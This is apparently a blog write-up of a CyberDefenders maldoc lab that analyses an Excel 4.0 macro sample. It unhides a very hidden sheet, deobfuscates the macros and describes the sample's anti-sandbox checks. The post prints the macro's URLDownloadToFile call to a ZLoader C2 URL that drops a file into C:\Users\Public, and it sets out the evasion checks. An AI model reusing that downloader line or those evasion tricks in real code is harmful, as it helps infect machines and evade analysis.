[Josh Stroschein](https://github.com/jstrosch) has done some awesome work collecting useful samples of Maldocs in his [Malware Samples Repo](https://github.com/jstrosch/malware-samples), and took the time to write up an exercise that's been uploaded to [CyberDefenders](https://cyberdefenders.org/labs/55) - which is what I'm exploring in this blog post.

While he's already provided a very detailed walkthrough, I've come at this with little experience analysing malicious Excel Documents, and so I thought it'd be worth padding it out with some additional information novices such as myself might find useful if they're new to the game.

See [here](https://opalsec.github.io/malware analysis/xlm_macros_1) for my first post on tackling encrypted workbooks, or read on to see how we can work around some common - but often effective - automated analysis counter-measures.

## Retrieving the files without cloning the whole repo:

The first step is to retrieve the samples, ideally without having to clone the entire malware-samples repo. While git doesn't have the inbuilt functionality to do this, we can achieve the same result by using Apache's Subversion.

You can easily download it with `apt install subversion`

> **NOTE:** For future reference - you'll need to replace _/tree/master_ with _/trunk_ in the github URL, and you can test with `svn ls` prior to downloading the folder using `svn export`

```
root@ubuntu:/home/montana/Documents# svn export https://github.com/jstrosch/malware-samples/trunk/malware_analysis_exercises/2021/February
```

Now that you've got it, move to the directory and deflate it with `unzip samples.zip`, entering the password of "infected" when prompted. For this walkthrough, we'll be working with Sample #2 (b5d469a07709b5ca6fee934b1e5e8e38.bin)

## Hidden & Very Hidden Sheets

The first obstacle we encounter is that the macros are stored in a _very hidden_ sheet - it's important to note the difference between these and normal _hidden_ sheets is that very hidden sheets don't present the "unhide" option in Excel to make them visible. This means we need to edit the file's hex code directly to make it visible.

The visibility of a sheet is represented by the fifth value of the Boundsheet entry, which is either 0x00 (visible), 0x01 (hidden) or 0x02 (very hidden).

"What the heck is a Boundsheet" I hear you ask? 

Great question - it's part of the BIFF Structure I mentioned in the first post, which dictates the layout of the Spreadsheet. We can check these with the following command:

```
root@ubuntu:/home/montana/Documents/February/bsample# oledump.py b5d469a07709b5ca6fee934b1e5e8e38.bin -p plugin_biff --pluginoptions "-o BOUNDSHEET -a" 
  1:      4096 '\x05DocumentSummaryInformation'
  2:       236 '\x05SummaryInformation'
  3:    159084 'Workbook'
               Plugin: BIFF plugin 
                 '0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \x00Sheet'
                  00000000: 26 A5 01 00 00 00 06 00  &¥......
                  00000008: 53 68 65 65 74 31        Sheet1
                 '0085     18 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden - \x00CSHykdYHv'
                  00000000: 3A D9 01 00 02 01 0A 00  :Ù......
                  00000008: 43 53 48 79 6B 64 59 48  CSHykdYH
                  00000010: 76 69                    vi
```

As you can see from the above - there's one visible sheet (26 A5 01 00 **00**) and one very hidden sheet (3A D9 01 00 **02**).

### Easy Wins(?)
First, let's try the tricks from our previous example - checking for all Excel 4.0 macros:

```
oledump.py b5d469a07709b5ca6fee934b1e5e8e38.bin -p plugin_biff --pluginoptions -x | less
```

![oledump_x](https://opalsec.github.io/assets/images/xlm_macros_2/oledump_x.png)

As you can see, it's not as straightforward as the previous example, and the presence of multiple cell formulas with the _ptgConcat_ function indicates it's going to be a Macro that leverages strings built by concatenating values in a bunch of cells in the hidden sheet. Gross.

All the way down at the bottom we see some interesting code calling reg.exe and dropping a file to the Public Users folder, along with a few interesting Excel 4.0 functions - FOPEN, FREAD, and so on. 

Unfortunately the parsing makes this difficult to read and therefore understand what the maldoc is doing - in particular, it ends with a GOTO function, but the cell value isn't parsed properly, so we can't tell where execution jumps to.

![oledump_x_1](https://opalsec.github.io/assets/images/xlm_macros_2/oledump_x_1.png)

Sadly, it looks like there are no easy wins to be had this time around.

### Unhiding Sheets

As mentioned, all that controls the visibility of a sheet is a single byte value in the BIFF Boundsheet structure, so to reveal a hidden or even very hidden sheet - we just need to change that value to 0x00.

To do that, simply search for the hex string corresponding to the very hidden sheet (which we found from the `"-o BOUNDSHEET -a"` command we ran earlier) using a hex editor like wxHexEditor (installed in REMNux) and change the fifth value from 02 to 00:

![unhide](https://opalsec.github.io/assets/images/xlm_macros_2/unhide.png)

### Anti-Analysis Counter-Measures

Now that it's visible, open the sheet in Excel to review the macro. Use the dropdown on the top left to select the "Auto_Open" entry, which will point you to Cell 727 - this is the start of the instructions that will run as soon as the Spreadsheet is opened with Macros enabled:

![J727](https://opalsec.github.io/assets/images/xlm_macros_2/J727.png)

To make sense of what you're seeing here, I'd recommend bookmarking and/or downloading this handy reference on [Excel 4.0 Functions](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)

Referencing this documentation, it looks like this set of instructions are a first attempt at Sandbox detection.

In summary, it uses reg.exe to dump HKCU\Microsoft\Office\<VERSION_NUM>\Excel\Security to the Public Users directory before searching for the string 0001 - if it doesn't find it, it terminates, otherwise jumps back up to J1 to run what's there. 

The significance of the 0001 string is that when set as the DWORD value for the VBAWarnings Key (which is dumped by the reg.exe command) it [allows all Macros](https://admx.help/?Category=Office2016&Policy=word16.Office.Microsoft.Policies.Windows::L_VBAWarningsPolicy) to run. This is a common configuration for Automatic Sandbox Detonation environments which enable all macros so it can see what they will do when they execute, but is very rarely seen on a legitimate workstation.

## Obfuscated Macros

Let's figure out what else is going on. Looking at the final command in Cell 734, it ends by directing execution to J1 (which we weren't able to see in the results from oledump.py), so we can jump up there and have a look around.

![obfuscated](https://opalsec.github.io/assets/images/xlm_macros_2/obfuscated.png)

At a glance, you can tell the formulas in the J column are constructing strings by concatenating the contents of the columns to the left, before hiding the workbook and commencing execution to the now deobfuscated strings, starting in cell K2.

There are two methods for deobfuscation, the first of which is what the Josh Stroschein suggested which is to copy the column values out, strip out the non-numeric characters, and plug them into a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Charcode('Line%20feed',10)). 

While this works fine for the shorter strings, the malware author threw in a few cells of useless guff in there to taint the output - this is an issue where you're trying to figure out the URL or domain name you need to block to prevent C2 comms, and you can't be sure the results aren't corrupted.

For example, the concatenated contents of column F deobfuscates to: `=CFAL("urGmon",URLDfonloadfoFile","JCCJJ",0"htUtpsE//ehelAeecrce.xyz/fbb3","c:\Uers\Publc\bmjnef.html"0,0)` 

In this case you'd have to go back to the formula to try and identify the dud values you need to strip to get an accurate URL. What a pain.

The much simpler technique I picked up from [DissectMalware](https://www.youtube.com/channel/UClshOnMPENbBSAG3KNRnlHw) was to interrupt execution of the macro by replacing the WORKBOOK.HIDE function with HALT(). This lets the macro run and deobfuscate the code, without finishing the chain of execution - kind of like setting a break point in a debugger:

![deobfuscated](https://opalsec.github.io/assets/images/xlm_macros_2/deobfuscated.png)

Immediately I've got actionable information based on the deobfuscated strings. I can:
1. Block `https://ethelenecrace.xyz/fbb3` to prevent 2nd stage infections anywhere else on the network;
2. Create detections for html files with high-entropy filenames being written to `c:\Users\Public\` to potentially identify other variants that drop the same payload, but via a different C2.

### Ugh, MORE Anti-Analysis Counter-Measures

The first five strings are interesting, as they're additional anti-sandbox measures:
1. Attempts to detect abnormally small screen width < 770 and height < 381;
2. Looks for a mouse being present - if there isn't one, it's likely a sandbox;
3. Checks if the computer can play a sound - if it can't, it's likely a barebones sandbox;
4. Verifies the environment is a Windows environment.

## Attribution

Unfortunately initial checks on this sample's C2 from regular sources didn't turn up anything - it's not present on URLHaus, and VT has it flagged generically as Malware by five vendors:

![VT.png](https://opalsec.github.io/assets/images/xlm_macros_2/VT.png)

That said, a hail-mary Google search for the C2 string shows it was identified by a reliable source on Twitter as being part of a ZLoader campaign:
